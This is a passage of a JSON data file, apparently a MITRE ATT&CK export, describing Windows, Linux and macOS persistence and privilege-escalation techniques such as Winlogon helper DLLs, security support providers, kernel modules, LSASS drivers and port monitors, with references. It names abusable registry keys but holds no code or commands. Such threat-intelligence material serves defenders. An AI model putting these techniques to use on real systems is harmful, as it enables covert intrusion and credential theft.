persistence.",
    "technique_references": [
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35",
    "platform": "windows",
    "tid": "T1547.004",
    "technique": "Winlogon Helper DLL",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "technique_references": [
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462",
    "platform": "windows",
    "tid": "T1547.005",
    "technique": "Security Support Provider",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462",
    "platform": "windows",
    "tid": "T1547.005",
    "technique": "Security Support Provider",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
    "technique_references": [
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
    "platform": "macos|linux",
    "tid": "T1547.006",
    "technique": "Kernel Modules and Extensions",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
    "technique_references": [
      {
        "source_name": "Apple Developer Configuration Profile",
        "url": "https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf",
        "description": "Apple. (2019, May 3). Configuration Profile Reference. Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Kernel Extension Deprecation",
        "url": "https://developer.apple.com/support/kernel-extensions/",
        "description": "Apple. (n.d.). Deprecated Kernel Extensions and System Extension Alternatives. Retrieved November 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "System and kernel extensions in macOS",
        "url": "https://support.apple.com/guide/deployment/system-and-kernel-extensions-in-macos-depa5fb8376f/web",
        "description": "Apple. (n.d.). System and kernel extensions in macOS. Retrieved March 31, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Reptile",
        "url": "https://github.com/f0rb1dd3n/Reptile",
        "description": "Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Phalanx2",
        "url": "https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html",
        "description": "Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "iDefense Rootkit Overview",
        "url": "http://www.megasecurity.org/papers/Rootkits.pdf",
        "description": "Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Loadable Kernel Module Insert and Remove LKMs",
        "url": "http://tldp.org/HOWTO/Module-HOWTO/x197.html",
        "description": "Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Diamorphine",
        "url": "https://github.com/m0nad/Diamorphine",
        "description": "Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Ventir",
        "url": "https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/",
        "description": "Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "User Approved Kernel Extension Pike’s",
        "url": "https://pikeralpha.wordpress.com/2017/08/29/user-approved-kernel-extension-loading/",
        "description": "Pikeralpha. (2017, August 29). User Approved Kernel Extension Loading…. Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Module Programming Guide",
        "url": "http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html",
        "description": "Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Skidmap",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/",
        "description": "Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Purves Kextpocalypse 2",
        "url": "https://richard-purves.com/2017/11/09/mdm-and-the-kextpocalypse-2/",
        "description": "Richard Purves. (2017, November 9). MDM and the Kextpocalypse . Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "RSAC 2015 San Francisco Patrick Wardle",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Synack Secure Kernel Extension Broken",
        "url": "https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/",
        "description": "Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Loadable Kernel Module",
        "url": "https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux",
        "description": "Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "root",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
    "platform": "macos|linux",
    "tid": "T1547.006",
    "technique": "Kernel Modules and Extensions",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
    "technique_references": [
      {
        "source_name": "Apple Developer Configuration Profile",
        "url": "https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf",
        "description": "Apple. (2019, May 3). Configuration Profile Reference. Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Kernel Extension Deprecation",
        "url": "https://developer.apple.com/support/kernel-extensions/",
        "description": "Apple. (n.d.). Deprecated Kernel Extensions and System Extension Alternatives. Retrieved November 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "System and kernel extensions in macOS",
        "url": "https://support.apple.com/guide/deployment/system-and-kernel-extensions-in-macos-depa5fb8376f/web",
        "description": "Apple. (n.d.). System and kernel extensions in macOS. Retrieved March 31, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Reptile",
        "url": "https://github.com/f0rb1dd3n/Reptile",
        "description": "Augusto, I. (2018, March 8). Reptile - LMK Linux rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Volatility Phalanx2",
        "url": "https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html",
        "description": "Case, A. (2012, October 10). Phalanx 2 Revealed: Using Volatility to Analyze an Advanced Linux Rootkit. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "iDefense Rootkit Overview",
        "url": "http://www.megasecurity.org/papers/Rootkits.pdf",
        "description": "Chuvakin, A. (2003, February). An Overview of Rootkits. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Loadable Kernel Module Insert and Remove LKMs",
        "url": "http://tldp.org/HOWTO/Module-HOWTO/x197.html",
        "description": "Henderson, B. (2006, September 24). How To Insert And Remove LKMs. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "CrowdStrike Linux Rootkit",
        "url": "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
        "description": "Kurtz, G. (2012, November 19). HTTP iframe Injecting Linux Rootkit. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Diamorphine",
        "url": "https://github.com/m0nad/Diamorphine",
        "description": "Mello, V. (2018, March 8). Diamorphine - LMK rootkit for Linux Kernels 2.6.x/3.x/4.x (x86 and x86_64). Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Ventir",
        "url": "https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/",
        "description": "Mikhail, K. (2014, October 16). The Ventir Trojan: assemble your MacOS spy. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "User Approved Kernel Extension Pike’s",
        "url": "https://pikeralpha.wordpress.com/2017/08/29/user-approved-kernel-extension-loading/",
        "description": "Pikeralpha. (2017, August 29). User Approved Kernel Extension Loading…. Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Module Programming Guide",
        "url": "http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html",
        "description": "Pomerantz, O., Salzman, P. (2003, April 4). Modules vs Programs. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Skidmap",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/",
        "description": "Remillano, A., Urbanec, J. (2019, September 19). Skidmap Linux Malware Uses Rootkit Capabilities to Hide Cryptocurrency-Mining Payload. Retrieved June 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Purves Kextpocalypse 2",
        "url": "https://richard-purves.com/2017/11/09/mdm-and-the-kextpocalypse-2/",
        "description": "Richard Purves. (2017, November 9). MDM and the Kextpocalypse . Retrieved September 23, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "RSAC 2015 San Francisco Patrick Wardle",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Wardle, P. (2015, April). Malware Persistence on OS X Yosemite. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Synack Secure Kernel Extension Broken",
        "url": "https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/",
        "description": "Wardle, P. (2017, September 8). High Sierra’s ‘Secure Kernel Extension Loading’ is Broken. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Loadable Kernel Module",
        "url": "https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux",
        "description": "Wikipedia. (2018, March 17). Loadable kernel module. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "root",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
    "platform": "windows",
    "tid": "T1547.008",
    "technique": "LSASS Driver",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
    "technique_references": [
      {
        "source_name": "Microsoft LSA Protection Mar 2014",
        "url": "https://technet.microsoft.com/library/dn408187.aspx",
        "description": "Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DLL Security",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx",
        "description": "Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Subsystem",
        "url": "https://technet.microsoft.com/library/cc961760.aspx",
        "description": "Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
    "platform": "windows",
    "tid": "T1547.008",
    "technique": "LSASS Driver",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
    "technique_references": [
      {
        "source_name": "Microsoft LSA Protection Mar 2014",
        "url": "https://technet.microsoft.com/library/dn408187.aspx",
        "description": "Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DLL Security",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx",
        "description": "Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Subsystem",
        "url": "https://technet.microsoft.com/library/cc961760.aspx",
        "description": "Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
    "platform": "windows",
    "tid": "T1547.010",
    "technique": "Port Monitors",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
    "technique_references": [
      {
        "source_name": "Bloxham",
        "url": "https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",
        "description": "Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "AddMonitor",
        "url": "http://msdn.microsoft.com/en-us/library/dd183341",
        "description": "Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
    "platform": "windows",
    "tid": "T1547.010",
    "technique": "Port Monitors",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
    "technique_references": [
      {
        "source_name": "Bloxham",
        "url": "https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf",
        "description": "Bloxham, B. (n.d.). Getting Windows to Play with Itself &#91;PowerPoint slides&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "AddMonitor",
        "url": "http://msdn.microsoft.com/en-us/library/dd183341",
        "description": "Microsoft. (n.d.). AddMonitor function. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "system|administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
    "platform": "windows",
    "tid": "T1547.012",
    "technique": "Print Processors",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
